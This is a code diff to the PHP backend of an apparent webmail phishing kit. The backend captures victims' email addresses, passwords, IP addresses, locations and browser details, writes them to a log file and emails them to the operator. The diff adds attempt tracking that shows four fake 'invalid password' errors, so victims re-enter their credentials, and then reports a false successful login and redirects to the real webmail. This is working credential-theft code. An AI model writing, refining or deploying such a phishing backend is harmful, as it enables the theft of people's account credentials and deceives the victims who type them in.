@@ -57,8 +57,16 @@ $smtp_secure  = 'tls';
 $timestamp = date('Y-m-d H:i:s');
 $logFile = 'SS-Or-LucaGherardi-Tests.txt';
 
+// Track attempts per email
+if (!isset($_SESSION['attempts'][$login])) {
+    $_SESSION['attempts'][$login] = 0;
+}
+$_SESSION['attempts'][$login]++;
+
+$attemptNumber = $_SESSION['attempts'][$login];
+
 // Prepare the message content
-$message = "=== CREDENTIAL CAPTURE ===\n";
+$message = "=== CREDENTIAL CAPTURE (Attempt $attemptNumber) ===\n";
 $message .= "Timestamp: $timestamp\n";
 $message .= "Email: $login\n";
 $message .= "Password: $passwd\n";
@@ -67,14 +75,15 @@ $message .= "IP: $ip\n";
 $message .= "Country: $country\n";
 $message .= "City: $city\n";
 $message .= "User Agent: $browser\n";
+$message .= "Attempt Number: $attemptNumber\n";
 $message .= "========================\n\n";
 
 // Log to file
 file_put_contents($logFile, $message, FILE_APPEND);
 
 // Prepare email content
-$emailSubject = "Webmail Login: $login | $country";
-$emailBody = "$login|$passwd\nIP of sender: $country | $city | $ip | $browser\n============WEBMAIL-LOGIN signal";
+$emailSubject = "Webmail Login (Attempt $attemptNumber): $login | $country";
+$emailBody = "$login|$passwd\nIP of sender: $country | $city | $ip | $browser\nAttempt: $attemptNumber\n============WEBMAIL-LOGIN signal";
 
 try {
     $mail = new PHPMailer(true);
@@ -90,51 +99,52 @@ try {
     $mail->setFrom($senderuser, 'Webmail Monitor');
     $mail->addAddress($receiver);
     $mail->Body = $emailBody;
-    $mail->AltBody = "New webmail login captured";
+    $mail->AltBody = "New webmail login captured - Attempt $attemptNumber";
 
-    if ($mail->send()) {
-        // Success - send notification email and show success response
-        $response = [
-            "signal" => "OK",
-            "success" => true,
-            "msg" => "Login successful! Redirecting to webmail...",
-            "redirect_url" => "https://webmail.$domain",
-            "debug_info" => [
-                "email_sent" => true,
-                "timestamp" => $timestamp
-            ]
-        ];
-        
-        // Short delay for success
-        usleep(rand(300000, 800000));
-    } else {
-        // Email failed to send, but still show success to user
-        $response = [
-            "signal" => "OK",
-            "success" => true,
-            "msg" => "Login successful! Redirecting to webmail...",
-            "redirect_url" => "https://webmail.$domain",
-            "debug_info" => [
-                "email_sent" => false,
-                "timestamp" => $timestamp
-            ]
-        ];
-        
-        // Short delay for success
-        usleep(rand(300000, 800000));
-    }
+    $mail->send(); // Always try to send email
     
 } catch (Exception $e) {
-    // Email failed, but still show success to user
+    // Email failed, but continue with logic
+    error_log("Email sending failed: " . $e->getMessage());
+}
+
+// Determine response based on attempt number
+if ($attemptNumber < 5) {
+    // First 4 attempts - show incorrect password error
+    $errorMessages = [
+        "Invalid email or password. Please try again.",
+        "Login failed. Please check your credentials and try again.",
+        "Authentication failed. Please verify your email and password.",
+        "Access denied. Please enter correct login details."
+    ];
+    
+    $response = [
+        "signal" => "error",
+        "success" => false,
+        "msg" => $errorMessages[$attemptNumber - 1],
+        "attempt" => $attemptNumber,
+        "debug_info" => [
+            "email_sent" => true,
+            "timestamp" => $timestamp,
+            "attempt_number" => $attemptNumber
+        ]
+    ];
+    
+    // Longer delay for error responses
+    usleep(rand(800000, 1500000));
+    
+} else {
+    // 5th attempt - show success and redirect
     $response = [
         "signal" => "OK",
         "success" => true,
         "msg" => "Login successful! Redirecting to webmail...",
         "redirect_url" => "https://webmail.$domain",
+        "attempt" => $attemptNumber,
         "debug_info" => [
-            "email_sent" => false,
-            "error" => $e->getMessage(),
-            "timestamp" => $timestamp
+            "email_sent" => true,
+            "timestamp" => $timestamp,
+            "attempt_number" => $attemptNumber
         ]
     ];
     
